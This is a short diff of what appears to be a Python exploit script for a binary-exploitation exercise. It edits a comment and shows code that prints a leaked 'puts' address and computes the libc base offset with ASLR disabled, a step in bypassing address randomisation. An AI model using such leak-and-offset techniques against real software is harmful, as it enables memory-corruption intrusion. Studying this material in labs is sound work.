@@ -74,7 +74,6 @@ leak = leak[1:]  # slice off line-feed (0xa).
 print("puts leak:", binascii.b2a_hex(leak), end="")
 print(" (check with gdb> x/i 0x... or gdb gef> got)")
 
-
 #######
 # calculated without aslr:
 # gdb gef> info proc map
@@ -82,7 +81,7 @@ print(" (check with gdb> x/i 0x... or gdb gef> got)")
 
 # noaslr:
 # leak:  b'7ffff7e4be10'
-# offset to libc: 482832 0x75e10
+# offset to libc: 0x75e10
 
 libc_start_noaslr = 0x7FFFF7DD6000
 offset_to_libc = 0x75E10
